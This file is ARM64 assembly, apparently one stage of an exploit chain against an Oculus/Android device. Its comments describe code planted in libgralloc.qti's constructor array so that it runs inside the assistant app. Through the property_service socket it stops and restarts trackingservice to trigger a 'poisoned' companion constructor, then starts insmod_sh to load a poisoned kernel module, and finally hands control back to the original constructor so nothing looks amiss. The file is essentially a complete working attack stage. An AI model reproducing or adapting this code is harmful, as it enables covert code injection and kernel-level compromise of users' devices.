// ctor B — planted in libgralloc.qti's init_array gap; runs when com.oculus.assistant (assistant_app)
// links the lib at startup. Drives all three chain triggers from a ctl.start/ctl.stop-capable domain:
//   setprop ctl.stop  trackingservice     (bounce it ...)
//   setprop ctl.start trackingservice     (... so the poisoned libcdsprpc ctor A poisons carrier+cfg)
//   nanosleep 600ms                        (let ctor A finish)
//   setprop ctl.start insmod_sh            (init finit_modules the poisoned carrier)
// then tail-calls the original ctor. Property writes use the property_service SETPROP2 protocol.
.section .text
.globl _ctorb
_ctorb:
    bti     c
    stp     x29, x30, [sp, #-48]!
    mov     x29, sp
    adr     x0, m_stop_track;  mov  w1, #35; bl sendprop
    adr     x0, m_start_track; mov  w1, #36; bl sendprop
    str     xzr, [sp, #32]                 // timespec.tv_sec = 0
    movz    x9, #0x4600
    movk    x9, #0x23c3, lsl #16           // tv_nsec = 600000000 (0x23c34600)
    str     x9, [sp, #40]
    add     x0, sp, #32
    mov     x1, xzr
    mov     x8, #101                        // nanosleep
    svc     #0
    adr     x0, m_start_insmod; mov w1, #30; bl sendprop
    ldp     x29, x30, [sp], #48
tailcall:
    .word   0                               // patched at runtime -> b orig_ctor
sendprop:                                    // x0 = msg ptr, w1 = msg len
    stp     x29, x30, [sp, #-48]!
    mov     x29, sp
    str     x19, [sp, #16]
    str     x20, [sp, #24]
    mov     x19, x0
    mov     w20, w1
    mov     w0, #1                           // AF_UNIX
    mov     w1, #1                           // SOCK_STREAM
    mov     w2, wzr
    mov     x8, #198                         // socket
    svc     #0
    str     x0, [sp, #32]                    // fd
    ldr     x0, [sp, #32]
    adr     x1, saddr
    mov     w2, #31                          // 2 + len("/dev/socket/property_service") + 1
    mov     x8, #203                         // connect
    svc     #0
    ldr     x0, [sp, #32]
    mov     x1, x19
    mov     w2, w20
    mov     x8, #64                          // write
    svc     #0
    ldr     x0, [sp, #32]
    add     x1, sp, #40
    mov     w2, #4
    mov     x8, #63                          // read (drain reply)
    svc     #0
    ldr     x0, [sp, #32]
    mov     x8, #57                          // close
    svc     #0
    ldr     x19, [sp, #16]
    ldr     x20, [sp, #24]
    ldp     x29, x30, [sp], #48
    ret
.balign 4
saddr:
    .byte   0x01, 0x00
    .asciz  "/dev/socket/property_service"
.balign 4
m_stop_track:
    .word   0x00020001
    .word   8
    .ascii  "ctl.stop"
    .word   15
    .ascii  "trackingservice"
.balign 4
m_start_track:
    .word   0x00020001
    .word   9
    .ascii  "ctl.start"
    .word   15
    .ascii  "trackingservice"
.balign 4
m_start_insmod:
    .word   0x00020001
    .word   9
    .ascii  "ctl.start"
    .word   9
    .ascii  "insmod_sh"
